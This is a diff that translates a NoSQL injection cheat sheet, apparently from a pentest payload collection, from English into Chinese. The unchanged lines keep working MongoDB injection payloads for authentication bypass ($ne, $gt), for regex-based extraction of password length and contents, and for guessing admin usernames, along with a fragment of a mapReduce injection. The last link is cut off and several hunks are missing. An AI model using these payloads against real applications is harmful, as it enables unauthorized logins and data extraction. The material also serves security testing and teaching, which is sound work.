@@ -1,29 +1,29 @@
-# NoSQL injection
+# NoSQL 注入
 
-> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+> NoSQL数据库相较于传统的SQL数据库提供了相对宽松的一致性限制。通过减少关系约束和一致性检查，NoSQL数据库在很多情况下提供很好的性能和扩展优势。即便NoSQL没有使用传统的SQL语法，它任然可能会受到注入攻击。
 
-## Summary
+## 摘要
 
-* [Tools](#tools)
+* [工具](#工具)
 * [Exploit](exploits)
-  * [Authentication Bypass](#authentication-bypass)
-  * [Extract length information](#extract-length-information)
-  * [Extract data information](#extract-data-information)
+	* [认证绕过](#认证绕过)
+	* [提取长度信息](#提取长度信息)
+	* [提取数据信息](#提取数据信息)
 * [Blind NoSQL](#blind-nosql)
-  * [POST with JSON body](#post-with-json-body)
-  * [GET](#get)
+	* [POST with JSON body](#post-with-json-body)
+	* [GET](#get)
 * [MongoDB Payloads](#mongodb-payloads)
 * [References](#references)
 
-## Tools
+## 工具
 
 * [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
 
 ## Exploit
 
-### Authentication Bypass
+### 认证绕过
 
-Basic authentication bypass using not equal ($ne) or greater ($gt)
+通过使用不等于(\$ne)或者大于(\$gt)进行认证绕过
 
 ```json
 in URL
@@ -36,14 +36,14 @@ in JSON
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
-### Extract length information
+### 提取长度信息
 
 ```json
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract data information
+### 提取数据信息
 
 ```json
 in URL
@@ -60,7 +60,7 @@ in JSON
 {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
 ```
 
-Extract data with "in"
+使用"in"提取数据
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
@@ -144,4 +144,4 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
 * [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
 * [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
-* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
+* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](
